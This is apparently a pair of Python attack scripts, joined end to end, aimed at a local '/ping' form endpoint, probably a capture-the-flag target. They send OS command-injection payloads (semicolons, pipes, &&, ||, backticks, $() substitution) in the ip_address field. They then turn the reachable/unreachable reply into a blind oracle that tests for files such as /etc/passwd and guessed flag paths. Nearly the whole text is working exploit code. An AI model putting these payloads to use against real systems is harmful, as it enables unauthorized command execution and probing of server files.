import requests
import re

base_url = "http://127.0.0.1:32943"
endpoint = "/ping"

headers = {"Content-Type": "application/x-www-form-urlencoded"}

def send_ping(payload):
    data = {"ip_address": payload}
    try:
        resp = requests.post(f"{base_url}{endpoint}", data=data, headers=headers, timeout=10)
        return resp.text
    except Exception as e:
        return f"ERROR: {e}"

def get_status(text):
    if "reachable" in text.lower() and "unreachable" not in text.lower():
        return "REACHABLE"
    elif "unreachable" in text.lower():
        return "UNREACHABLE"
    return "UNKNOWN"

print("COMMAND INJECTION OPERATOR TESTS")
print("=" * 70)

# Test which operators actually execute commands
operator_tests = [
    ("Semicolon - IP then cmd", "127.0.0.1 ; echo test"),
    ("Semicolon - cmd then IP", "echo test ; 127.0.0.1"),
    ("AND - IP then cmd", "127.0.0.1 && echo test"),
    ("AND - cmd then IP", "echo test && 127.0.0.1"),
    ("OR - IP then cmd", "127.0.0.1 || echo test"),
    ("OR - cmd then IP", "false || 127.0.0.1"),
    ("PIPE - IP to cmd", "127.0.0.1 | cat"),
    ("PIPE - cmd to IP", "echo 127.0.0.1 | ping -c 1"),
    ("BACKTICK", "`echo 127.0.0.1`"),
    ("DOLLAR PAREN", "$(echo 127.0.0.1)"),
]

print("\n[Testing operators]")
results = {}
for desc, payload in operator_tests:
    resp = send_ping(payload)
    status = get_status(resp)
    results[desc] = status
    marker = "[+]" if status == "REACHABLE" else "[-]"
    print(f"{marker} {desc:30} -> {status:12} | {payload}")

print("\n" + "=" * 70)
print("BOOLEAN LOGIC - Test with TRUE/FALSE")
print("=" * 70)

# Now test boolean logic with file existence
# Format: cmd_1 && 127.0.0.1 || fake_ip
# If cmd_1 succeeds, ping runs with 127.0.0.1 → REACHABLE
# If cmd_1 fails, ping runs with fake_ip → UNREACHABLE

boolean_tests = [
    ("true AND IP", "true && 127.0.0.1"),
    ("false AND IP", "false && 127.0.0.1"),
    ("true OR IP", "true || 127.0.0.1"),
    ("false OR IP", "false || 127.0.0.1"),
    
    # File existence via exit codes
    ("test -f /etc/hostname ; [ $? -eq 0 ] && 127.0.0.1", "test -f /etc/hostname ; [ $? -eq 0 ] && 127.0.0.1"),
    ("test -f /NONEXISTENT ; [ $? -eq 0 ] && 127.0.0.1", "test -f /NONEXISTENT_abc ; [ $? -eq 0 ] && 127.0.0.1"),
    
    # Alternative: nested control
    ("If exists ping", "test -f /etc/hostname && 127.0.0.1 || 999.999.999.999"),
    ("If missing ping", "test -f /NONEXISTENT_abc && 127.0.0.1 || 999.999.999.999"),
]

for desc, payload in boolean_tests:
    resp = send_ping(payload)
    status = get_status(resp)
    marker = "[+]" if status == "REACHABLE" else "[-]"
    print(f"{marker} {desc:30} -> {status:12}")

print("\n" + "=" * 70)
print("SIMPLIFIED BOOLEAN FILE TEST")
print("=" * 70)

# Simpler approach
tests = [
    ("hostname exists - test && IP", "test -f /etc/hostname && 127.0.0.1"),
    ("hostname exists - IP if test", "127.0.0.1 | test -f /etc/hostname"),
    ("nonexistent - test && IP", "test -f /NONEXISTENT_abc && 127.0.0.1"),
    ("nonexistent - IP if test", "127.0.0.1 | test -f /NONEXISTENT_abc"),
]

for desc, payload in tests:
    resp = send_ping(payload)
    status = get_status(resp)
    marker = "[+]" if status == "REACHABLE" else "[-]"
    print(f"{marker} {desc:35} -> {status}")

import requests
import re

base_url = "http://127.0.0.1:32943"
endpoint = "/ping"

headers = {"Content-Type": "application/x-www-form-urlencoded"}

def send_ping(payload):
    data = {"ip_address": payload}
    try:
        resp = requests.post(f"{base_url}{endpoint}", data=data, headers=headers, timeout=10)
        return resp.text
    except Exception as e:
        return f"ERROR: {e}"

def get_status(text):
    if "reachable" in text.lower() and "unreachable" not in text.lower():
        return "REACHABLE"
    elif "unreachable" in text.lower():
        return "UNREACHABLE"
    return "UNKNOWN"

print("COMMAND SUBSTITUTION FOR BOOLEAN BLIND")
print("=" * 70)

# Key insight: backticks and $() substitute their output
# So we can use: $(cmd && echo 127.0.0.1)
# If cmd succeeds → outputs 127.0.0.1 → REACHABLE
# If cmd fails → outputs nothing → UNREACHABLE

substitution_tests = [
    ("true", "$(true)"),
    ("false", "$(false)"),
    ("true echo IP", "$(true && echo 127.0.0.1)"),
    ("false echo IP", "$(false && echo 127.0.0.1)"),
    
    # File existence through command substitution
    ("/etc/hostname exists", "$(test -f /etc/hostname && echo 127.0.0.1)"),
    ("/etc/passwd exists", "$(test -f /etc/passwd && echo 127.0.0.1)"),
    ("/NONEXISTENT not exists", "$(test -f /NONEXISTENT_abc && echo 127.0.0.1)"),
    
    # Flag paths
    ("/flag", "$(test -f /flag && echo 127.0.0.1)"),
    ("/flag.txt", "$(test -f /flag.txt && echo 127.0.0.1)"),
    ("/app/flag", "$(test -f /app/flag && echo 127.0.0.1)"),
    ("/root/flag", "$(test -f /root/flag && echo 127.0.0.1)"),
    ("/tmp/flag", "$(test -f /tmp/flag && echo 127.0.0.1)"),
    ("/challenge/flag", "$(test -f /challenge/flag && echo 127.0.0.1)"),
]

for desc, payload in substitution_tests:
    resp = send_ping(payload)
    status = get_status(resp)
    marker = "[+]" if status == "REACHABLE" else "[-]"
    print(f"{marker} {desc:30} -> {status:12}")

print("\n" + "=" * 70)
print("BACKTICK VERSION")
print("=" * 70)

backtick_tests = [
    ("true echo IP", "`true && echo 127.0.0.1`"),
    ("false echo IP", "`false && echo 127.0.0.1`"),
    ("/etc/hostname exists", "`test -f /etc/hostname && echo 127.0.0.1`"),
    ("/NONEXISTENT not exists", "`test -f /NONEXISTENT_abc && echo 127.0.0.1`"),
    ("/flag", "`test -f /flag && echo 127.0.0.1`"),
    ("/flag.txt", "`test -f /flag.txt && echo 127.0.0.1`"),
]

for desc, payload in backtick_tests:
    resp = send_ping(payload)
    status = get_status(resp)
    marker = "[+]" if status == "REACHABLE" else "[-]"
    print(f"{marker} {desc:30} -> {status:12}")

print("\n" + "=" * 70)
print("ALTERNATIVE: Using if-then with $()")
print("=" * 70)

if_tests = [
    ("if true", "$(if true; then echo 127.0.0.1; fi)"),
    ("if false", "$(if false; then echo 127.0.0.1; fi)"),
    ("if file exists", "$(if [ -f /etc/hostname ]; then echo 127.0.0.1; fi)"),
    ("if file missing", "$(if [ -f /NONEXISTENT_abc ]; then echo 127.0.0.1; fi)"),
    ("/flag if exists", "$(if [ -f /flag ]; then echo 127.0.0.1; fi)"),
    ("/flag.txt if exists", "$(if [ -f /flag.txt ]; then echo 127.0.0.1; fi)"),
]

for desc, payload in if_tests:
    resp = send_ping(payload)
    status = get_status(resp)
    marker = "[+]" if status == "REACHABLE" else "[-]"
    print(f"{marker} {desc:30} -> {status:12}")

